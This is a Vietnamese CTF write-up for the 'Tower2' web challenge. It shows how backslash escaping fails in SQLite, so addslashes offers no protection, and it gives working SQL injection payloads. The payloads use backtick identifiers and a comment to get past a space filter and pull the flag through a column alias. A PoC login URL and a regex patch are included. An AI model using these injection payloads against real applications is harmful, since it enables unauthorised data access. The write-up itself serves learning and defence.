# Tower2:
Src unpatched [http://binaries.svattt.org:5000/unpatched/tower2/tower2.py](http://binaries.svattt.org:5000/unpatched/tower2/tower2.py)
```
http://tower2.svattt.org:5002/?source=1
Hint 1: addslashes for sqlite ?
Hint 2: ` 
Hint 3: """ Warning addslashes() should NOT be used to quote your strings for SQLite queries; it will lead to strange results when retrieving your data. """ - said php.net
```
## Exploit

Đây là một bài dạng web sử dụng python kết hợp database sqlite3 .  
Trong đề có sẵn đoạn code với mục đích in ra flag
```python
        for r in result:
            flag = _FLAG_ if 'flag' in r.keys() else ''
            if r[1] == 1:
                conn.close()
                return BODY_HTML.format("""
                    <h3>EHLO {user}!</h3>
                        <!-- DEBUG: {flag} -->
                </div>""".format(user=username,flag=flag))
```
Dựa vào gợi ý 1 và 3, backslash trong sqlite3 không phải là ký tự escape như trong mysql, ... do vậy function addslashes không có tác dụng.  
DEBUG: sử dụng sqlite3 cli trong ubuntu
```
sqlite> select '123\4';
123\4
```
với cấu trúc query như sau:  
"SELECT username,username='{}' AND password='{}' FROM users"  
Sử dụng gợi ý thứ 2, \` được dùng như 1 ký tự để xác định `identifier`, điều này giúp bypass việc lọc ký tự "space" (0x20), sử dụng -- để vô hiệu hóa phần còn lại.

```
username = 123'OR`username`!=
password = from`users`--
```
OR\`username\`!='xxxxx' (`xxxxx` là phần ' AND ...' đã chuyển thành string) nhằm mục đích cho cột 2 (r[1]) trả về giá trị 1  (có sẵn user` guest`)
Kết hợp lại ta có
```
SELECT username,username='123\'OR`username`!=' AND password='from`users`--' FROM users"
```
Để có flag là 1 từ khóa trong r.keys(), thực hiện debug với python-sqlite3 và local database tự tạo; dựa trên kết quả quan sát được, r.keys() là các tên cột trong câu lệnh select; cụ thể là  
"SELECT username,username='{}' AND password='{}' FROM users"  
Câu lệnh trên đưa ra 2 key là `username` và `username='<username>' AND password='<password>'` với username, passsword tùy chọn

Qua quá trình guessing thì với tên cột thứ 3 là username[4] trả về key '4';
-> final payload
```
username = 123'OR`username`!=
password = ,username[flag]from`users`--

SELECT username,username='123\'OR`username`!=' AND password=',username[flag]from`users`--' FROM users"
```
Not working [PoC](http://tower2.svattt.org:5002/login?username=guest%27OR%60username%60!%3D&password=%2Cusername[flag]from%60users%60--) *Patched by N/A ??*

Sau khi tìm hiểu lại thì thực chất`username[flag]` là username với alias flag, và [, `, " là tương đương nhau theo [document](https://www.sqlite.org/lang_keywords.html) của sqlite3.
## Patch:
bổ sung ' ở function filter, do limit 5 chars:
```
+++s = sub(r'[\'|\)|\/|\*]','',s)
---s = sub(r'[\(|\)|\/|\*]','',s)
```